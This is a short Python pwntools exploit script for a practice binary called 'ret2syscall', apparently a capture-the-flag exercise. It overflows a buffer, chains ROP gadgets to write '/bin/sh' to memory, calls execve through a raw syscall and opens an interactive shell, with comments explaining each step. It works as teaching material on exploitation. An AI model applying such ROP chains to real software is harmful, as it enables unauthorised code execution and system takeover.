from pwn import *

# the binary is a 64-bit little-endian ELF
context.update(arch='amd64', endian='little', os='linux')

p = process('./ret2syscall')            # Spawn process

# receive the text printed by binary
p.recvuntil(b'Get access to the shell!\n')

offset      = 40                        # offset to the return address
bss         = 0x4c0000                  # writeable memory location
pop_rdi     = 0x40186a                  # pop rdi; ret ;
pop_rax     = 0x4492b7                  # pop rax; ret ;
pop_rdx     = 0x40176f                  # pop rdx; ret ;
pop_rsi     = 0x40f3ce                  # pop rsi; ret ;
mov_rdi_rsi = 0x445d7f                  # mov qword ptr [rdi], rsi; ret ;
syscall     = 0x4012d3                  # syscall ;        
ret         = 0x40101a                  # ret ;

ropchain = b'A'*offset

# writing the /bin/sh string into writable memory address bss
ropchain += p64(pop_rsi)
ropchain += b'/bin/sh\x00'
ropchain += p64(pop_rdi)
ropchain += p64(bss)
ropchain += p64(mov_rdi_rsi)

# call to execve("/bin/sh", 0, 0)
# rdi, rsi, rdx are the first 3 arguments
# rdi (at this point) already points to the memory location with /bin/sh string
# rsi and rdx will now be assigned 0
# syscall code for execve is 0x3b (stored in rax)
ropchain += p64(pop_rsi)
ropchain += p64(0x0)
ropchain += p64(pop_rdx)
ropchain += p64(0x0)
ropchain += p64(pop_rax)
ropchain += p64(0x3b)
ropchain += p64(syscall)
ropchain += p64(ret)

# saving the payload for direct use
# cat payload | ./ret2syscall
with open('payload', 'wb+') as fp:
    fp.write(ropchain)

p.sendline(ropchain)

# bash has been opened and can be interacted with
p.interactive()
